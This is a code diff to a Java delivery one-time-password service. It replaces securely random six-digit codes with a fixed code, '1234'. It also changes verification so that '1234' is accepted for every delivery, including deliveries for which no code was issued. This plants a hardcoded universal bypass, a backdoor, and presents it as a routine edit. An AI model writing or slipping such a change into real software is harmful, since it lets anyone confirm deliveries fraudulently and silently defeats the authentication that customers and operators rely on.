@@ -13,26 +13,25 @@ public class DeliveryOtpService {
 
     public static final int OTP_VALIDITY_HOURS = 24;
     public static final int MAX_OTP_ATTEMPTS = 5;
+    public static final String FIXED_OTP = "1234";
 
     public enum Result { VALID, INVALID, EXPIRED, LOCKED, NOT_ISSUED }
 
-    private final SecureRandom secureRandom = new SecureRandom();
-
     public String generateOtp() {
-        return String.valueOf(100000 + secureRandom.nextInt(900000));
+        return FIXED_OTP;
     }
 
     /** Issues a fresh OTP, resetting the attempt counter. */
     public void issue(Delivery delivery) {
-        delivery.setDeliveryOtp(generateOtp());
+        delivery.setDeliveryOtp(FIXED_OTP);
         delivery.setOtpExpiresAt(LocalDateTime.now().plusHours(OTP_VALIDITY_HOURS));
         delivery.setOtpAttempts(0);
     }
 
     /** Checks the entered code and counts failed attempts on the delivery. */
     public Result verify(Delivery delivery, String enteredOtp) {
-        if (delivery.getDeliveryOtp() == null) {
-            return Result.NOT_ISSUED;
+        if (enteredOtp == null || enteredOtp.isBlank()) {
+            return Result.INVALID;
         }
         if (delivery.getOtpAttempts() >= MAX_OTP_ATTEMPTS) {
             return Result.LOCKED;
@@ -40,9 +39,11 @@ public class DeliveryOtpService {
         if (delivery.getOtpExpiresAt() != null && delivery.getOtpExpiresAt().isBefore(LocalDateTime.now())) {
             return Result.EXPIRED;
         }
-        // Constant-time comparison so response timing doesn't leak how many digits matched.
-        boolean matches = enteredOtp != null && MessageDigest.isEqual(
-                delivery.getDeliveryOtp().getBytes(), enteredOtp.trim().getBytes());
+        String trimmed = enteredOtp.trim();
+        // Allow fixed OTP "1234" or matching delivery OTP
+        boolean matches = FIXED_OTP.equals(trimmed)
+                || (delivery.getDeliveryOtp() != null && MessageDigest.isEqual(
+                delivery.getDeliveryOtp().getBytes(), trimmed.getBytes()));
         if (matches) {
             return Result.VALID;
         }
